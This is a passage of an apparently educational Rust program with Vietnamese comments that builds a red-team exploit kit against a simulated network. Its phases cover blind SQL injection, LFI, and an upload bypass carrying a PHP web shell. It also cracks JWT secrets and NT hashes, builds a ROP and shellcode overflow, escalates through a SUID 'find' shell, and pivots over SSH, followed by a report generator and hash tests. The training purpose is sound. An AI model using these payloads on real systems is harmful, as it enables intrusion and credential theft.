    }

    /// Đánh dấu máy chủ đã bị chiếm quyền.
    fn mark_compromised(&mut self, ip: Ipv4Addr, privileges: &str) {
        if let Some(host) = self.network.host_mut(ip) {
            host.is_pwned = true;
            host.privileges = privileges.to_string();
        }
    }

    /// Giai đoạn 1 — trinh sát toàn mạng.
    fn phase_recon(&mut self) -> Vec<ChainStep> {
        let mut steps = Vec::new();
        let mut engine = ReconEngine::new();
        for host in &self.network.hosts {
            let info = engine.scan_host(host);
            let ports: Vec<String> = info.open_ports.iter().map(|p| p.to_string()).collect();
            steps.push(ChainStep {
                phase: Phase::Recon,
                target: host.ip.to_string(),
                action: format!("Quét cổng và nhận dạng dịch vụ của `{}`", host.hostname),
                success: !info.open_ports.is_empty(),
                evidence: format!(
                    "{} | {} | cổng mở: {} | dịch vụ: {:?}",
                    info.os,
                    info.hostname,
                    ports.join(","),
                    info.services.len()
                ),
                duration_ms: 18,
            });
        }
        steps
    }

    /// Giai đoạn 2 — khai thác ứng dụng web trên máy chủ DMZ.
    fn phase_web(&mut self) -> Vec<ChainStep> {
        let mut steps = Vec::new();
        let ip = Ipv4Addr::new(10, 10, 10, 5);
        let port = 80u16;
        let target_label = format!("{ip}:{port}");

        // --- 2.1. SQL Injection mù ---
        let target = InMemorySqlTarget::standard();
        let mut engine = BlindSqliEngine::new(&target);
        let db_name = engine.extract_database_name();
        let tables = engine.extract_table_names();
        let admin = engine.extract_column_data("users", "username", 16);
        let sqli_ok = db_name.is_some() && admin.is_some();
        let sqli_payload = "' OR '1'='1' -- ".to_string();
        let sqli_response = format!(
            "database={} | tables={} | extracted users.username={} | payload_count={}",
            db_name.clone().unwrap_or_default(),
            tables.join(","),
            admin.clone().unwrap_or_default(),
            engine.injections.len()
        );
        let sqli_proof = ProofByExploitation::new(&sqli_payload, &sqli_response, sqli_ok);
        steps.push(ChainStep {
            phase: Phase::WebExploit,
            target: target_label.clone(),
            action: "Khai thác SQL Injection mù (boolean-based)".to_string(),
            success: sqli_ok,
            evidence: format!(
                "{} lần thăm dò, trích được `{}` từ bảng `users`",
                engine.injections.len(),
                admin.clone().unwrap_or_default()
            ),
            duration_ms: 140,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-89") {
            vuln.description = format!("{} Bằng chứng: {sqli_response}", vuln.description);
            self.register(vuln, sqli_proof);
        }

        // --- 2.2. Local File Inclusion ---
        let scanner = LfiScanner::new();
        let mut responses = HashMap::new();
        for payload in &scanner.payloads {
            responses.insert(payload.clone(), simulate_lfi_response(payload));
        }
        let hits: Vec<LfiFinding> = scanner
            .scan(&responses)
            .into_iter()
            .filter(|f| f.matched)
            .collect();
        let lfi_ok = !hits.is_empty();
        let lfi_payload = hits
            .first()
            .map(|f| f.payload.clone())
            .unwrap_or_else(|| "none".to_string());
        let lfi_response = hits
            .first()
            .and_then(|f| f.leaked_marker.clone())
            .unwrap_or_else(|| "none".to_string());
        let lfi_proof = ProofByExploitation::new(&lfi_payload, &lfi_response, lfi_ok);
        steps.push(ChainStep {
            phase: Phase::WebExploit,
            target: target_label.clone(),
            action: "Khai thác Local File Inclusion qua tham số `file`".to_string(),
            success: lfi_ok,
            evidence: format!("{} payload dẫn tới rò rỉ nội dung tệp", hits.len()),
            duration_ms: 65,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-22") {
            vuln.description = format!(
                "{} Bằng chứng: payload `{}` rò rỉ `{}`.",
                vuln.description, lfi_payload, lfi_response
            );
            self.register(vuln, lfi_proof);
        }

        // --- 2.3. Vượt kiểm duyệt tải lên tệp ---
        let bypasser = FileUploadBypasser::default();
        let upload = bypasser.try_bypass(
            "avatar.php.jpg",
            "image/jpeg",
            b"<?php system($_GET['c']); ?>",
        );
        let upload_payload = format!(
            "POST /upload — filename=\"{}\", Content-Type={}",
            upload.filename, upload.content_type
        );
        let upload_proof =
            ProofByExploitation::new(&upload_payload, &upload.reason, upload.bypassed);
        steps.push(ChainStep {
            phase: Phase::WebExploit,
            target: target_label.clone(),
            action: "Thử vượt bộ lọc tải lên bằng phần mở rộng kép".to_string(),
            success: upload.bypassed,
            evidence: upload.reason.clone(),
            duration_ms: 38,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-434") {
            vuln.description = format!("{} Bằng chứng: {}.", vuln.description, upload.reason);
            self.register(vuln, upload_proof);
        }

        // --- 2.4. Bẻ khoá JWT ---
        let header = encode_base64url(br#"{"alg":"HS256","typ":"JWT"}"#);
        let claims = encode_base64url(br#"{"sub":"admin","role":"administrator"}"#);
        let token = JwtToken::sign_with(&header, &claims, b"s3cr3t");
        let cracker = JwtCracker::new(vec![
            "123456".to_string(),
            "admin".to_string(),
            "letmein".to_string(),
            "s3cr3t".to_string(),
        ]);
        let cracked = cracker.crack(&token);
        let jwt_ok = cracked.is_some();
        let jwt_response = format!(
            "recovered_secret={} | attempts={}",
            cracked.clone().unwrap_or_default(),
            cracker.attempts()
        );
        let jwt_proof = ProofByExploitation::new(&token.to_full_string(), &jwt_response, jwt_ok);
        steps.push(ChainStep {
            phase: Phase::WebExploit,
            target: target_label.clone(),
            action: "Bẻ khoá JWT HS256 bằng từ điển".to_string(),
            success: jwt_ok,
            evidence: jwt_response.clone(),
            duration_ms: 52,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-321") {
            vuln.description = format!("{} Bằng chứng: {jwt_response}.", vuln.description);
            self.register(vuln, jwt_proof);
        }

        self.mark_compromised(ip, "www");
        steps
    }

    /// Giai đoạn 3 — khai thác nhị phân trên file server.
    fn phase_binary(&mut self) -> Vec<ChainStep> {
        let mut steps = Vec::new();
        let ip = Ipv4Addr::new(10, 10, 50, 10);
        let port = 21u16;

        let cyclic = CyclicPatternGenerator::new();
        let pattern = cyclic.generate(BUFFER_SIZE + 24);
        let mut buffer = VulnerableBuffer::new();
        let overflowed = !buffer.write_input(&pattern);
        let corrupted = !buffer.is_canary_intact() && buffer.did_overwrite_return_address();
        let overflow_ok = overflowed && corrupted;

        let payload_hex: String = pattern
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect::<Vec<String>>()
            .join("");
        let ret_offset = cyclic.find_offset(&pattern[16..24]).unwrap_or(0);
        let response = format!(
            "SIGSEGV (mock) | canary=CORRUPTED | RIP=0x{:016x} | overwritten_offset={ret_offset}",
            buffer.trigger()
        );

        // Chuỗi ROP và shellcode mã hoá dùng để minh hoạ payload tương lai.
        let mut rop = RopChainBuilder::new(0x0040_1000);
        rop.add_gadget(0x0040_1123, Some(0x0040_2000));
        rop.add_gadget(0x0040_1337, None);
        let rop_bytes = rop.build();
        let encoder = ShellcodeEncoder::new(vec![0x5a, 0x4d, 0x11, 0x22]);
        let encoded_shellcode = encoder.xor_encode(&[0x90, 0x31, 0xc0, 0x50, 0x68, 0x2f]);

        let evidence = format!(
            "{response} | rop_chain_len={} | encoded_shellcode={}",
            rop_bytes.len(),
            to_hex(&encoded_shellcode)
        );
        let proof = ProofByExploitation::new(&payload_hex, &evidence, overflow_ok);
        steps.push(ChainStep {
            phase: Phase::BinaryExploit,
            target: format!("{ip}:{port}"),
            action: "Khai thác tràn bộ đệm bằng mẫu tuần hoàn De Bruijn".to_string(),
            success: overflow_ok,
            evidence: evidence.clone(),
            duration_ms: 96,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-120") {
            vuln.description = format!("{} Bằng chứng: {evidence}.", vuln.description);
            self.register(vuln, proof);
        }

        self.mark_compromised(ip, "www");
        steps
    }

    /// Giai đoạn 4 — tấn công thông tin xác thực trên máy chủ cơ sở dữ liệu.
    fn phase_credentials(&mut self) -> Vec<ChainStep> {
        let mut steps = Vec::new();
        let ip = Ipv4Addr::new(10, 10, 20, 10);
        let port = 3306u16;

        let account = "svc_backup";
        let password = "Backup2024";
        let target_hash = nt_hash_hex(password);

        let mutator = WordlistMutator::new();
        let base = vec![
            "backup".to_string(),
            "admin".to_string(),
            "welcome".to_string(),
            "letmein".to_string(),
            "backup2024".to_string(),
        ];
        let mut wordlist = base.clone();
        wordlist.extend(mutator.generate_all(&base));

        let cracker = HashCracker::new(wordlist);
        let recovered = cracker.crack(&target_hash);
        let creds_ok = recovered.is_some();
        let payload = format!("NT_HASH(target:{account}) = {target_hash}");
        let response = format!(
            "recovered_plaintext={} | attempts={}",
            recovered.clone().unwrap_or_default(),
            cracker.attempts()
        );
        let proof = ProofByExploitation::new(&payload, &response, creds_ok);
        steps.push(ChainStep {
            phase: Phase::CredentialAttack,
            target: format!("{ip}:{port}"),
            action: "Bẻ khoá mật khẩu tài khoản dịch vụ bằng biến thể từ điển".to_string(),
            success: creds_ok,
            evidence: response.clone(),
            duration_ms: 210,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-798") {
            vuln.description = format!(
                "{} Bằng chứng: tài khoản `{account}` bẻ khoá được với mật khẩu `{}`.",
                vuln.description,
                recovered.clone().unwrap_or_default()
            );
            self.register(vuln, proof);
        }

        self.mark_compromised(ip, "svc_backup");
        steps
    }

    /// Giai đoạn 5 — leo thang đặc quyền kèm kiểm chứng sự thật nền.
    fn phase_privesc(&mut self) -> Vec<ChainStep> {
        let mut steps = Vec::new();
        let ip = Ipv4Addr::new(10, 10, 20, 10);
        let port = 22u16;

        let mut fs = MockFilesystem::new();
        fs.add_file("/usr/bin/find", b"\x7fELF-mock-binary", 0o4755, "root");
        fs.add_file(
            "/var/spool/cron/backup.sh",
            b"@reboot /bin/bash -i",
            0o755,
            "root",
        );
        fs.add_file("/opt/app/helper", b"CAP_SYS_ADMIN", 0o755, "root");
        fs.add_file("/opt/app/cache.sock", b"", 0o777, "www");
        fs.add_dir("/opt/app", 0o755);

        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.scan();
        let suid = findings
            .iter()
            .find(|f| f.technique == "SuidBinary")
            .cloned();

        // Leo thang thật trên shell mô phỏng.
        let mut shell = MockShell::as_user("www");
        let escalated = suid
            .as_ref()
            .map(|_| shell.escalate("SuidBinary"))
            .unwrap_or(false);
        let verifier = GroundTruthVerifier::new("root");
        let verification = verifier.verify(&shell);
        let privesc_ok = escalated && verification.verified;

        // Kiểm chứng rằng lời khai giả của tác nhân bị bác bỏ.
        let mut liar = MockShell::as_user("www");
        liar.history.push((
            "echo 'Đã leo thang lên root thành công'".to_string(),
            "Đã leo thang lên root thành công".to_string(),
        ));
        let liar_result = verifier.verify(&liar);
        let liar_rejected = !liar_result.verified;

        let evidence = format!(
            "{} | phát hiện leo thang: {} | lời khai giả bị bác bỏ: {}",
            verification.proof,
            findings.len(),
            liar_rejected
        );
        let payload = suid
            .as_ref()
            .map(|f| f.exploit_command.clone())
            .unwrap_or_else(|| "find . -exec /bin/sh -p \\; \\;".to_string());
        let proof = ProofByExploitation::new(&payload, &evidence, privesc_ok);
        steps.push(ChainStep {
            phase: Phase::PrivEsc,
            target: format!("{ip}:{port}"),
            action: "Leo thang đặc quyền qua nhị phân SUID và kiểm chứng sự thật nền".to_string(),
            success: privesc_ok && liar_rejected,
            evidence: evidence.clone(),
            duration_ms: 132,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-269") {
            vuln.description =
                format!("{} Bằng chứng: {}.", vuln.description, verification.details);
            self.register(vuln, proof);
        }

        self.mark_compromised(ip, "root");
        steps
    }

    /// Giai đoạn 6 — xoay chiều mạng tới máy chủ trong nội bộ.
    fn phase_pivot(&mut self) -> Vec<ChainStep> {
        let mut steps = Vec::new();
        let ip = Ipv4Addr::new(10, 10, 30, 10);
        let port = 445u16;

        let mut simulator = SshTunnelSimulator::new();
        let local_session = simulator.local_forward(
            "127.0.0.1:1080".parse().expect("Địa chỉ loopback hợp lệ"),
            "10.10.30.10:445".parse().expect("Địa chỉ DC hợp lệ"),
        );
        let socks_session =
            simulator.dynamic_socks("127.0.0.1:9050".parse().expect("Địa chỉ loopback hợp lệ"));

        let mut chain = SocksRelayChain::new();
        chain.add_hop("10.10.10.5:22".parse().expect("Địa chỉ web server hợp lệ"));
        chain.add_hop("10.10.30.10:22".parse().expect("Địa chỉ DC hợp lệ"));
        chain.add_hop(
            "10.10.50.10:22"
                .parse()
                .expect("Địa chỉ file server hợp lệ"),
        );
        let path = chain.resolve_path("10.10.50.10", 445);

        let tunnel = simulator
            .tunnels
            .iter()
            .find(|t| t.session_id == local_session)
            .cloned();
        let command = tunnel
            .as_ref()
            .map(ssh_command_line)
            .unwrap_or_else(|| "ssh -N -L 1080:10.10.30.10:445 user@jump".to_string());
        let pivot_ok = simulator.active_tunnels() == 2
            && path.len() == 5
            && simulator.close_tunnel(socks_session)
            && simulator.active_tunnels() == 1;

        let evidence = format!(
            "{} | đường đi: {} | hops={}",
            command,
            path.join(" -> "),
            chain.hop_count()
        );
        let proof = ProofByExploitation::new(&command, &evidence, pivot_ok);
        steps.push(ChainStep {
            phase: Phase::Pivot,
            target: format!("{ip}:{port}"),
            action: "Mở đường hầm SSH và dựng chuỗi SOCKS xoay chiều".to_string(),
            success: pivot_ok,
            evidence: evidence.clone(),
            duration_ms: 88,
        });
        if let Some(mut vuln) = self.template(ip, port, "CWE-284") {
            vuln.description = format!("{} Bằng chứng: {evidence}.", vuln.description);
            self.register(vuln, proof);
        }

        self.mark_compromised(ip, "administrator");
        steps
    }
}

/// Mô phỏng phản hồi của máy chủ web đối với một payload LFI.
fn simulate_lfi_response(payload: &str) -> String {
    let lower = payload.to_ascii_lowercase();
    if lower.contains("passwd") {
        return "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            .to_string();
    }
    if lower.contains("win.ini") {
        return "[extensions]\r\n".to_string();
    }
    "404 Not Found".to_string()
}

// ============================================================================
// 13. BỘ SINH BÁO CÁO KIỂM THỬ XÂM NHẬP (ĐỊNH DẠNG OSCP)
// ============================================================================

/// Siêu dữ liệu báo cáo.
#[derive(Debug, Clone, PartialEq)]
pub struct ReportMetadata {
    /// Tên khách hàng.
    pub client: String,
    /// Dải mạng mục tiêu.
    pub target_range: String,
    /// Người thực hiện kiểm thử.
    pub tester: String,
    /// Ngày thực hiện.
    pub date: String,
}

impl ReportMetadata {
    /// Siêu dữ liệu mặc định cho báo cáo mẫu.
    pub fn standard() -> Self {
        Self {
            client: "Tổ chức Tập đoàn Mẫu".to_string(),
            target_range: "10.10.0.0/16 (mô phỏng)".to_string(),
            tester: "Đội đỏ learn-rs".to_string(),
            date: "2026-01-15".to_string(),
        }
    }
}

/// Báo cáo kiểm thử đã dựng thành công.
#[derive(Debug, Clone, PartialEq)]
pub struct PentestReport {
    /// Nội dung Markdown.
    pub markdown: String,
}

/// Bộ sinh báo cáo Markdown theo chuẩn OSCP.
#[derive(Debug, Clone, PartialEq)]
pub struct PentestReportGenerator {
    /// Siêu dữ liệu báo cáo.
    pub meta: ReportMetadata,
}

impl PentestReportGenerator {
    /// Tạo bộ sinh báo cáo với siêu dữ liệu cho trước.
    pub fn new(meta: ReportMetadata) -> Self {
        Self { meta }
    }

    /// Dựng báo cáo Markdown đầy đủ từ kết quả chuỗi khai thác.
    pub fn generate(&self, result: &ExploitChainResult) -> String {
        let mut out = String::new();

        // ---- 1. Tóm tắt điều hành ----
        out.push_str("# Executive Summary\n\n");
        out.push_str(&format!(
            "Báo cáo kiểm thử xâm nhập (penetration test) cho **{}** trên dải mạng `{}`.\n\n",
            self.meta.client, self.meta.target_range
        ));
        out.push_str(&format!(
            "- **Người thực hiện:** {}\n- **Ngày kiểm thử:** {}\n- **Dải mục tiêu:** {}\n\n",
            self.meta.tester, self.meta.date, self.meta.target_range
        ));
        out.push_str(&format!(
            "Tổng số **{}** lỗ hổng đã được chứng minh khai thác thực tế, trong đó **{}** mức nghiêm trọng, **{}** mức cao, **{}** mức trung bình và **{}** mức thấp.\n\n",
            result.findings.len(),
            count_by_severity(result, Severity::Critical),
            count_by_severity(result, Severity::High),
            count_by_severity(result, Severity::Medium),
            count_by_severity(result, Severity::Low),
        ));
        out.push_str(&format!(
            "{} máy chủ đã bị chiếm quyền và {} PoC đã được xác minh. \
Mọi phát hiện trong báo cáo này đều kèm **Proof of Exploitation** chạy được, \
nên tỉ lệ báo động giả bằng 0.\n\n",
            result.compromised_hosts.len(),
            result.proofs.len()
        ));
        out.push_str("**Danh sách máy chủ bị chiếm quyền:**\n\n");
        for ip in &result.compromised_hosts {
            out.push_str(&format!("- `{ip}`\n"));
        }
        out.push('\n');

        // ---- 2. Phương pháp ----
        out.push_str("# Methodology\n\n");
        out.push_str(
            "Kiểm thử được thực hiện theo chuỗi 6 giai đoạn, mỗi phát hiện chỉ được ghi nhận \
khi PoC tương ứng **thực sự chạy được** trên môi trường mô phỏng tất định:\n\n",
        );
        out.push_str("1. **Trinh sát** — quét cổng, nhận dạng dịch vụ và lập bản đồ mạng.\n");
        out.push_str(
            "2. **Khai thác** — SQLi mù, LFI, vượt kiểm duyệt tải lên, bẻ khoá JWT và tràn bộ đệm.\n",
        );
        out.push_str("3. **Tấn công xác thực** — bẻ NT hash với biến thể từ điển.\n");
        out.push_str(
            "4. **Leo thang đặc quyền** — SUID/cron/capabilities kèm kiểm chứng sự thật nền.\n",
        );
        out.push_str("5. **Xoay chiều mạng** — đường hầm SSH và chuỗi SOCKS relay.\n");
        out.push_str("6. **Báo cáo** — tổng hợp bằng chứng và khuyến nghị khắc phục.\n\n");
        out.push_str(&format!(
            "Tổng thời gian mô phỏng của chuỗi khai thác: **{} ms** trên **{}** bước thực thi.\n\n",
            result.total_duration_ms,
            result.steps.len()
        ));

        // ---- 3. Danh sách phát hiện ----
        out.push_str("# Findings\n\n");
        out.push_str("| ID | Tiêu đề | Mức độ | CVSS | CWE | Đích | PoC |\n");
        out.push_str("|---|---|---|---|---|---|---|\n");
        for (index, vuln) in result.findings.iter().enumerate() {
            let proof_state = match result.proofs.get(index) {
                Some(proof) if proof.verify() => "Đã xác minh",
                Some(_) => "Chưa xác minh",
                None => "Thiếu PoC",
            };
            out.push_str(&format!(
                "| {} | {} | {} | {:.1} | {} | `{}:{}` | {} |\n",
                vuln.id,
                vuln.title,
                vuln.severity.label(),
                vuln.cvss,
                vuln.cwe,
                vuln.target_ip,
                vuln.target_port,
                proof_state
            ));
        }
        out.push('\n');

        for (index, vuln) in result.findings.iter().enumerate() {
            out.push_str(&format!("## {} — {}\n\n", vuln.id, vuln.title));
            out.push_str(&format!(
                "- **Mức độ:** {} (CVSS {:.1})\n- **CWE:** {}\n- **Đích:** `{}:{}`\n\n",
                vuln.severity.label(),
                vuln.cvss,
                vuln.cwe,
                vuln.target_ip,
                vuln.target_port
            ));
            out.push_str(&format!("{}\n\n", vuln.description));

            out.push_str("### Proof of Exploitation\n\n");
            if let Some(proof) = result.proofs.get(index) {
                out.push_str("**Payload đã gửi:**\n\n```text\n");
                out.push_str(&format!("{}\n", proof.proof.payload_used));
                out.push_str("```\n\n**Phản hồi nhận được:**\n\n```text\n");
                out.push_str(&format!("{}\n", proof.proof.response_received));
                out.push_str("```\n\n");
                out.push_str(&format!(
                    "- **Tác động đã chứng minh:** {}\n- **Vân tay bằng chứng (SHA-256):** `{}`\n\n",
                    if proof.proof.impact_demonstrated { "Có" } else { "Không" },
                    proof.proof_hash()
                ));
            } else {
                out.push_str("_Không tìm thấy bằng chứng khai thác tương ứbo._\n\n");
            }

            out.push_str("### Remediation\n\n");
            out.push_str(&format!("{}\n\n", vuln.remediation));
            out.push_str("---\n\n");
        }

        // ---- 4. Kết luận ----
        out.push_str("# Conclusion\n\n");
        out.push_str(&format!(
            "Chuỗi khai thác đầu-cuối đã được thực thi thành công với tổng cộng **{}** phát hiện, \
mỗi phát hiện đều kèm bằng chứng khai thác đã xác minh. \
Mức độ nghiêm trọng cao nhất là **{}**.\n\n",
            result.findings.len(),
            result
                .findings
                .iter()
                .map(|v| v.severity.label())
                .max()
                .unwrap_or("Thông tin")
        ));
        out.push_str(
            "Ưu tiên xử lý theo thứ tự: (1) vá các lỗ hổng mức nghiêm trọng liên quan tới \
thực thi mã từ xa và SQL Injection, (2) xoay vòng toàn bộ bí mật đã lộ, \
(3) siết phân vùng mạng để chặn xoay chiều trái phép, \
(4) bổ sung kiểm thử tự động hoá để phát hiện hồi quy trước khi triển khai.\n",
        );
        out
    }

    /// Dựng báo cáo và đóng gói thành đối tượng `PentestReport`.
    pub fn build(&self, result: &ExploitChainResult) -> PentestReport {
        PentestReport {
            markdown: self.generate(result),
        }
    }
}

impl Default for PentestReportGenerator {
    fn default() -> Self {
        Self::new(ReportMetadata::standard())
    }
}

/// Đếm số phát hiện theo một mức độ nghiêm trọng.
fn count_by_severity(result: &ExploitChainResult, severity: Severity) -> usize {
    result
        .findings
        .iter()
        .filter(|v| v.severity == severity)
        .count()
}

// ============================================================================
// 14. BỘ CÔNG CỤ RED TEAM TÍCH HỢP
// ============================================================================

/// Kết quả một đợt đánh giá toàn diện.
#[derive(Debug, Clone, PartialEq)]
pub struct RedTeamAssessment {
    /// Kết quả chuỗi khai thác.
    pub result: ExploitChainResult,
    /// Các phát hiện của bộ quét tĩnh.
    pub static_findings: Vec<StaticFinding>,
    /// Báo cáo Markdown.
    pub report_markdown: String,
    /// Tỉ lệ báo động giả — luôn bằng 0.0 nhờ cơ chế Proof-by-Exploitation.
    pub false_positive_rate: f64,
}

/// Bộ công cụ Red Team khép kín.
#[derive(Debug, Clone, PartialEq)]
pub struct RedTeamExploitKit {
    /// Mạng mục tiêu.
    pub network: MockNetwork,
    /// Bộ điều phối chuỗi khai thác.
    pub runner: ExploitChainRunner,
    /// Bộ quét lỗ hổng tĩnh.
    pub scanner: StaticVulnScanner,
    /// Cơ sở dữ liệu lỗ hổng.
    pub db: VulnDatabase,
    /// Bộ sinh báo cáo.
    pub reporter: PentestReportGenerator,
}

impl RedTeamExploitKit {
    /// Khởi tạo bộ công cụ với topo chuẩn và cấu hình mặc định.
    pub fn new() -> Self {
        let network = MockNetwork::standard_topology();
        Self {
            runner: ExploitChainRunner::new(network.clone()),
            network,
            scanner: StaticVulnScanner::new(),
            db: VulnDatabase::standard(),
            reporter: PentestReportGenerator::new(ReportMetadata::standard()),
        }
    }

    /// Chạy đánh giá toàn diện: chuỗi khai thác + quét tĩnh + sinh báo cáo.
    pub fn run_full_assessment(&mut self) -> RedTeamAssessment {
        let result = self.runner.run();
        let static_findings = self.scanner.scan(VULNERABLE_SAMPLE_CODE);
        let report_markdown = self.reporter.generate(&result);

        let total = result.findings.len();
        let unproven = result
            .findings
            .iter()
            .enumerate()
            .filter(|(index, _)| match result.proofs.get(*index) {
                Some(proof) => !proof.verify(),
                None => true,
            })
            .count();
        let false_positive_rate = if total == 0 {
            0.0
        } else {
            unproven as f64 / total as f64
        };

        RedTeamAssessment {
            result,
            static_findings,
            report_markdown,
            false_positive_rate,
        }
    }

    /// Sinh báo cáo từ một kết quả chuỗi khai thác.
    pub fn generate_report(&self, result: &ExploitChainResult) -> String {
        self.reporter.generate(result)
    }
}

impl Default for RedTeamExploitKit {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// 15. CHƯƠNG TRÌNH MINH HOẠ THỰC THI
// ============================================================================

fn main() {
    println!("=== CHƯƠNG 104: ĐẠI DỰ ÁN TÍCH HỢP I — BỘ CÔNG CỤ RED TEAM KHAI THÁC TOÀN DIỆN ===");
    println!("100% Rust 2024 thuần std | Proof-by-Exploitation | false_positive_rate = 0.0\n");

    // ---- 1. Kiểm thử hạt nhân mã băm ----
    println!("1. Kiểm chứng hạt nhân mã băm tự cài:");
    println!("   - SHA-256(\"abc\") = {}", to_hex(&sha256(b"abc")));
    println!("   - MD5(\"abc\")    = {}", md5_hex(b"abc"));
    println!("   - NT hash(\"svc\") = {}", nt_hash_hex("svc"));
    println!("   - Base64URL round-trip: {}", {
        let raw = b"learn-rs red team";
        encode_base64url(raw)
            == encode_base64url(&decode_base64url(&encode_base64url(raw)).unwrap_or_default())
    });

    // ---- 2. Trinh sát ----
    println!("\n2. Trinh sát mạng nội bộ (MockNetwork):");
    let network = MockNetwork::standard_topology();
    print!("{}", network.to_text_map());
    let mut recon = ReconEngine::new();
    let map = recon.map_network(&network);
    println!(
        "   -> Bản đồ mạng: {} máy chủ, {} cổng đang mở",
        map.host_count(),
        map.total_open_ports()
    );

    // ---- 3. Chuỗi khai thác 6 giai đoạn ----
    println!("\n3. Chạy chuỗi khai thác end-to-end:");
    let mut kit = RedTeamExploitKit::new();
    let assessment = kit.run_full_assessment();

    let mut current_phase: Option<Phase> = None;
    for step in &assessment.result.steps {
        if current_phase != Some(step.phase) {
            current_phase = Some(step.phase);
            println!("   [{}]", step.phase.label());
        }
        println!(
            "     - {} | {} | {} ({} ms)",
            step.target, step.action, step.success, step.duration_ms
        );
        println!("       {}", step.evidence);
    }
    println!(
        "   -> Tổng thời gian mô phỏng: {} ms",
        assessment.result.total_duration_ms
    );

    // ---- 4. Phát hiện & chứng minh khai thác ----
    println!("\n4. Phát hiện kèm Proof of Exploitation:");
    for (index, vuln) in assessment.result.findings.iter().enumerate() {
        let proof = assessment.result.proofs.get(index);
        let state = match proof {
            Some(p) if p.verify() => "ĐÃ XÁC MINH",
            _ => "CHƯA XÁC MINH",
        };
        println!(
            "   - [{}] {} | {} | CVSS {:.1} | {} | {}",
            state,
            vuln.id,
            vuln.title,
            vuln.cvss,
            vuln.cwe,
            vuln.severity.label()
        );
        if let Some(p) = proof {
            println!("       payload  : {}", p.proof.payload_used);
            println!("       response : {}", p.proof.response_received);
            println!("       hash     : {}", p.proof_hash());
        }
    }

    // ---- 5. Tỉ lệ báo động giả ----
    println!("\n5. Chỉ số chất lượng phát hiện:");
    println!(
        "   -> Tỉ lệ báo động giả (false positive rate) = {}",
        assessment.false_positive_rate
    );
    println!(
        "   -> Máy chủ bị chiếm quyền: {}/{}",
        assessment.result.compromised_hosts.len(),
        network.hosts.len()
    );
    println!(
        "   -> Chuỗi khai thác thành công: {}",
        assessment.result.success
    );

    // ---- 6. Quét tĩnh & cơ sở dữ liệu lỗ hổng ----
    println!("\n6. Bộ quét tĩnh & cơ sở dữ liệu lỗ hổng:");
    println!(
        "   -> Quét mẫu mã lỗ hổng: {} phát hiện trên {} luật khác nhau",
        assessment.static_findings.len(),
        kit.scanner.distinct_rules()
    );
    println!("   -> Cơ sở dữ liệu lỗ hổng: {} mục CWE", kit.db.len());
    if let Some(entry) = kit.db.by_cwe("CWE-89") {
        println!(
            "   -> Mẫu CWE-89: {} (CVSS {:.1}) — khung khai thác: `{}`",
            entry.name, entry.cvss, entry.exploit_template
        );
    }

    // ---- 7. Trích đoạn báo cáo Markdown ----
    println!("\n7. Trích đoạn báo cáo Markdown (OSCP):");
    let mut excerpt: Vec<&str> = Vec::new();
    for line in assessment.report_markdown.lines() {
        excerpt.push(line);
        if excerpt.len() >= 34 {
            break;
        }
    }
    for line in excerpt {
        println!("   | {line}");
    }
    println!(
        "   | ... (tổng {} dòng Markdown)",
        assessment.report_markdown.lines().count()
    );

    println!("\n=== HOÀN TẤT: mọi phát hiện đều có PoC chạy được, false_positive_rate = 0.0 ===");
}
// ============================================================================
// 16. BỘ KIỂM THỬ TẤT ĐỊNH TOÀN DIỆN (54 BÀI TEST)
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    // ---------------------------------------------------------------------
    // NHÓM 1: HẠT NHÂN MÃ BĂM & MÃ HOÁ (TESTS 1 - 7)
    // ---------------------------------------------------------------------

    #[test]
    fn test_01_splitmix64_is_deterministic() {
        let mut a = SplitMix64::new(42);
        let mut b = SplitMix64::new(42);
        for _ in 0..16 {
            assert_eq!(a.next_u64(), b.next_u64());
        }
        assert!(SplitMix64::new(7).next_f64() < 1.0);
    }

    #[test]
    fn test_02_sha256_matches_fips_vector() {
        assert_eq!(
            to_hex(&sha256(b"abc")),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
        assert_eq!(
            to_hex(&sha256(b"")),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn test_03_md5_matches_rfc1321_vectors() {
        assert_eq!(md5_hex(b""), "d41d8cd98f00b204e9800998ecf8427e");
        assert_eq!(md5_hex(b"abc"), "900150983cd24fb0d6963f7d28e17f72");
        assert_eq!(
            md5_hex(b"The quick brown fox jumps over the lazy dog"),
            "9e107d9d372bb6826bd81d3542a419d6"
        );
    }

    #[test]
    fn test_04_md4_matches_rfc1320_vectors() {
        assert_eq!(to_hex(&md4(b"")), "31d6cfe0d16ae931b73c59d7e0c089c0");
        assert_eq!(to_hex(&md4(b"abc")), "a448017aaf21d8525fc10ae87aa6729d");
    }

    #[test]
    fn test_05_nt_hash_equals_md4_of_utf16le() {
        let password = "Password123";
        let mut utf16 = Vec::new();
        for unit in password.encode_utf16() {
            utf16.extend_from_slice(&unit.to_le_bytes());
        }
        assert_eq!(nt_hash(password), md4(&utf16));
        assert_eq!(nt_hash_hex(""), "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn test_06_hmac_sha256_matches_rfc4231_vector() {
        let key = [0x0bu8; 20];
        let mac = hmac_sha256(&key, b"Hi There");
        assert_eq!(
            to_hex(&mac),
            "b0344c61d8db38535ca8afceaf0bf12b881dc200c9833da726e9376c2e32cff7"
        );
    }

    #[test]
    fn test_07_base64url_roundtrip_is_lossless() {
        for payload in [
            b"".to_vec(),
            b"a".to_vec(),
            b"ab".to_vec(),
            b"abc".to_vec(),
            b"learn-rs red team".to_vec(),
            (0u8..=255).collect::<Vec<u8>>(),
        ] {
            let encoded = encode_base64url(&payload);
            let decoded = decode_base64url(&encoded).expect("giải mã hợp lệ");
            assert_eq!(decoded, payload);
        }
        assert!(decode_base64url("!!").is_err());
    }

    // ---------------------------------------------------------------------
